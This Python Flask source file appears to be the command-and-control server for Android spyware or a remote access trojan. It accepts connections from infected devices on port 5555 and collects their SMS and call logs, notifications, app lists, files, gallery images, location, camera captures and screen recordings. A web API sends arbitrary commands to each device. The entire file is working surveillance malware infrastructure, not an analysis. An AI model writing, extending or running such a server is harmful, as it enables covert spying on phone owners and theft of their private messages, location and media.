import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
clients = {}
server_logs = []
file_transfers = {}
lock = threading.Lock()

# Folder initialization
DIRS = ['captured_images', 'device_downloads', 'screen_recordings']
for d in DIRS:
    if not os.path.exists(d): os.makedirs(d)

def add_log(msg):
    t = time.strftime("%H:%M:%S")
    formatted = f"[{t}] {msg}"
    print(formatted)
    server_logs.insert(0, formatted)
    if len(server_logs) > 100: server_logs.pop()

def create_client_data():
    return {
        "sms": [], "calls": [], "apps": [], "notifications": [],
        "fm": {"path": "/", "files": []}, "gallery": {"page": 0, "files": []},
        "info": {}, "location": {"url": None, "img": None, "status": "idle"},
        "media": {"last_img": None, "last_vid": None, "status": "idle"},
        "msgs": []
    }

def handle_tcp_data(raw_line, cid):
    try:
        packet = json.loads(raw_line).get('data', {})
        t = packet.get('type')
        with lock:
            if cid not in clients: return
            cd = clients[cid]['data']
            
            if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
            elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
            elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
            elif t == 'APP_LIST': cd['apps'] = packet.get('apps', [])
            elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
            elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
            elif t == 'LOCATION_SUCCESS': 
                loc = packet.get('data', {}) if isinstance(packet.get('data'), dict) else {"url": packet.get('url')}
                cd['location'].update({"url": loc.get('url'), "img": loc.get('image_url'), "status": "success"})
            elif t == 'LOCATION_PENDING': cd['location']['status'] = "waiting"
            elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
            elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
            elif t == 'WALLPAPER_STATUS': cd['msgs'].insert(0, packet.get('status'))
            elif 'CHUNK' in t:
                chunk = packet.get('chunk_data', {})
                fname = chunk.get('filename')
                if fname: file_transfers.setdefault(fname, []).append(chunk.get('chunk'))
            elif 'END' in t:
                fname = packet.get('file')
                if fname and fname in file_transfers:
                    folder = 'captured_images' if (fname.endswith(('.jpg','.png','.mp4'))) else 'device_downloads'
                    path = os.path.join(folder, secure_filename(fname))
                    with open(path, 'wb') as f:
                        f.write(base64.b64decode("".join(file_transfers.pop(fname))))
                    if fname.endswith('.mp4'): cd['media'].update({"last_vid": fname, "status": "done"})
                    else: cd['media']['last_img'] = fname
                    add_log(f"File Saved: {fname}")
            
            add_log(f"Received {t} from {cid}")
    except Exception as e: add_log(f"Error parsing: {e}")

def client_handler(conn, addr):
    cid = f"{addr[0]}:{addr[1]}"
    with lock: clients[cid] = {'socket': conn, 'data': create_client_data()}
    add_log(f"Client Connected: {cid}")
    buffer = ""
    try:
        while True:
            chunk = conn.recv(16384).decode('utf-8', errors='ignore')
            if not chunk: break
            buffer += chunk
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip(): handle_tcp_data(line.strip(), cid)
    except: pass
    finally:
        with lock: 
            if cid in clients: del clients[cid]
        add_log(f"Client Disconnected: {cid}")
        conn.close()

def tcp_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 5555))
    s.listen(20)
    add_log("TCP Engine Active on Port 8888")
    while True:
        c, a = s.accept()
        threading.Thread(target=client_handler, args=(c, a), daemon=True).start()

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/status')
def get_status():
    with lock:
        devs = [{'id': k, 'model': v['data']['info'].get('Model','?'), 'bat': v['data']['info'].get('Battery','?')} for k,v in clients.items()]
    return jsonify({"logs": server_logs, "devices": devs})

@app.route('/api/data/<cid>')
def get_data(cid):
    with lock: return jsonify(clients[cid]['data'] if cid in clients else {"error": 404})

@app.route('/api/command', methods=['POST'])
def send_cmd():
    r = request.json
    cid, cmd = r.get('client_id'), r.get('cmd')
    with lock:
        if cid in clients:
            try:
                clients[cid]['socket'].sendall(f"{cmd}\n".encode())
                add_log(f"Command Sent to {cid}: {cmd}")
                return jsonify({"status": "ok"})
            except: return jsonify({"status": "fail"}), 500
    return jsonify({"status": "not_found"}), 404

@app.route('/api/delete', methods=['POST'])
def del_file():
    fn = secure_filename(request.json.get('filename'))
    for d in DIRS:
        p = os.path.join(d, fn)
        if os.path.exists(p): 
            os.remove(p)
            return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 404

@app.route('/captured_images/<path:f>')
def serve_img(f): return send_from_directory('captured_images', f)

if __name__ == '__main__':
    threading.Thread(target=tcp_server, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
